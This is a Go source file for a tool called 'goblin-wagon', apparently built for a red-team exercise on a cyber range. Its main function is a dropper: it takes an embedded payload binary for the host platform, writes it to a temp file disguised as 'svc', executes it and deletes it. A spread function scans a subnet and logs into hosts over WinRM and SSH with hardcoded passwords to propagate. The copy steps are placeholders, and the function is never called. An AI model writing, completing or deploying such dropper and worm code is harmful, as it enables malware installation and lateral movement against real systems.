package main

import (
	_ "embed"
    "os"
    "os/exec"
	"context"
	"fmt"
	"io"
	"net"
	"runtime"
	"sync"
	"unicode"
	"log"
	"github.com/masterzen/winrm"
	"golang.org/x/crypto/ssh"
)

type Platform struct {
	OS string
	Arch string
}

func is_only_letters(s string) bool {
	for _, character := range s{
		if !unicode.IsLetter(character){
			return false
		}
	}
	return true
}

func reverse_lookup_hosts(subnet string) []string {
    var (
        found []string
        mu    sync.Mutex
        wg    sync.WaitGroup
    )
 
    sem := make(chan struct{}, 20) // 20 concurrent lookups

    for i := 1; i < 255; i++ {
        wg.Add(1)
        go func(i int) {
            defer wg.Done()
            sem <- struct{}{}
            defer func() { <-sem }()

            ip := fmt.Sprintf("%s.%d", subnet, i)
            _, err := net.LookupAddr(ip)

            if err != nil { 
				return 
			}

			mu.Lock()
			found = append(found, ip)
			mu.Unlock()
        }(i)
    }

    wg.Wait()
    return found
}


func establish_winRM(host_ip, username, pswd string) (*winrm.Client, error){
	endpoint := winrm.NewEndpoint(
        host_ip,      // host
        5985,   	 // port (5985 http, 5986 https)
        false,  	 // https
        false,  	 // insecure
        nil,    	 // tlsCert
        nil,    	 // tlsKey
        nil,    	 // caCert
        0,      	 // timeout
    )

	client, err := winrm.NewClient(endpoint, username, pswd)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func run_WinRM_cmds(winrm_client *winrm.Client, cmd string) error {
	_, err := winrm_client.RunWithContext(context.Background() ,cmd, io.Discard, io.Discard)
	return err
}

func establish_SSH(host_ip, username, pswd string) (*ssh.Client, error){
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(pswd),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", host_ip + ":22", config)
	if err != nil {
		return nil, err
	}

	return client, nil
}

func run_SSH_cmds(ssh_client *ssh.Client, cmd string) error {
	session, err := ssh_client.NewSession()
	if err != nil {
		return err
	}
	defer session.Close()

	return session.Run(cmd)

}

/*
Look for next host to move to

1. Look at DNS records

2. Brute force connection by trying WinRM or SSH
*/
func spread() {
	exclusion_list := []string{
		// Our team systems
		"10.10.100.101",
		"10.10.100.102",
		"10.10.100.103",
		"10.10.100.104",
		"10.10.100.105",
		"10.10.100.106",
		"10.10.100.107",
		"10.10.100.108",
	}

	// Grey team systems that have to be excluded
	for i := 200; i < 255; i++ {
		exclusion_list = append(exclusion_list, fmt.Sprintf("%s.%d", "10.10.10", i))
	} 

	exclusion_map := make(map[string]bool)
	for _, ip := range exclusion_list {
		exclusion_map[ip] = true
	}

	target_hosts := reverse_lookup_hosts("10.10.10")

	for _, host_ip := range target_hosts {

		// Skip IPs that are not in target scope
		if exclusion_map[host_ip] {
			continue
		}

		// ********************************************
		// Brute force connect to IPs via SSH or WinRM
		// ********************************************

		// WinRM
		winrm_client, err := establish_winRM(host_ip, "sjohnson", "UwU?OwO!67")
		if err != nil {
			fmt.Println("Failed to WinRM to: " + host_ip)
		}

		// Command to copy itself to new host
		run_WinRM_cmds(winrm_client, "ipconfig")

		// SSH
		ssh_client, err := establish_SSH(host_ip, "cyberrange", "Cyberrange123!")
		if err != nil {
			fmt.Println("Failed to SSH to: " + host_ip) // debugging
		}
		defer ssh_client.Close()

		// Command to copy itself to new host
		run_SSH_cmds(ssh_client, "echo hi")

	} 

}

//go:embed binaries/payload_linux_amd64
var payload_linux_amd64 []byte

//go:embed binaries/payload_linux_386
var payload_linux_386 []byte

//go:embed binaries/payload_linux_arm64
var payload_linux_arm64 []byte

//go:embed binaries/payload_windows_amd64.exe
var payload_windows_amd64 []byte

//go:embed binaries/payload_windows_386.exe
var payload_windows_386 []byte

//go:embed binaries/payload_windows_arm64.exe
var payload_windows_arm64 []byte

func main() {
    log.SetFlags(log.Ltime | log.Lshortfile)
    log.Println("[*] goblin-wagon starting")

    host_os := runtime.GOOS
    arch    := runtime.GOARCH

    log.Printf("[*] detected OS: %s | Arch: %s", host_os, arch)

    // used to format to get only the number in 'intelXX' or 'amdXX'
    if !is_only_letters(arch) {
        arch = arch[len(arch)-2:]
        log.Printf("[*] arch trimmed to: %s", arch)
    }

    payloads := map[Platform][]byte{
        {OS: "linux",   Arch: "amd64"}: payload_linux_amd64,
        {OS: "linux",   Arch: "386"}:   payload_linux_386,
        {OS: "linux",   Arch: "arm64"}: payload_linux_arm64,
        {OS: "windows", Arch: "amd64"}: payload_windows_amd64,
        {OS: "windows", Arch: "386"}:   payload_windows_386,
        {OS: "windows", Arch: "arm64"}: payload_windows_arm64,
    }

    key := Platform{OS: host_os, Arch: arch}
    log.Printf("[*] looking up platform key: %+v", key)

    data, ok := payloads[key]
    if !ok {
        log.Printf("[-] no payload matched for OS=%s Arch=%s -- bailing", host_os, arch)
        return
    }
    log.Printf("[+] payload found, size: %d bytes", len(data))

    ext := ""
    if host_os == "windows" {
        ext = ".exe"
    }

    tmp, err := os.CreateTemp("", "svc*"+ext)
    if err != nil {
        log.Printf("[-] failed to create temp file: %v", err)
        return
    }
    log.Printf("[*] temp file created: %s", tmp.Name())

    n, err := tmp.Write(data)
    if err != nil {
        log.Printf("[-] failed to write payload to temp file: %v", err)
        return
    }
    log.Printf("[+] wrote %d bytes to temp file", n)
    tmp.Close()

    if err := os.Chmod(tmp.Name(), 0700); err != nil {
        log.Printf("[-] chmod failed: %v", err)
        return
    }
    log.Printf("[*] chmod 0700 applied")

    cmd := exec.Command(tmp.Name())
    cmd.Stdout = os.Stdout  // pipe output so you can see what wagon.go is doing
    cmd.Stderr = os.Stderr
    log.Printf("[*] executing payload: %s", tmp.Name())

    if err := cmd.Run(); err != nil {
        log.Printf("[-] payload execution failed: %v", err)
    } else {
        log.Printf("[+] payload exited cleanly")
    }

    if err := os.Remove(tmp.Name()); err != nil {
        log.Printf("[-] failed to remove temp file: %v", err)
    } else {
        log.Printf("[*] temp file cleaned up")
    }

    log.Println("[*] goblin-wagon done")
}
	
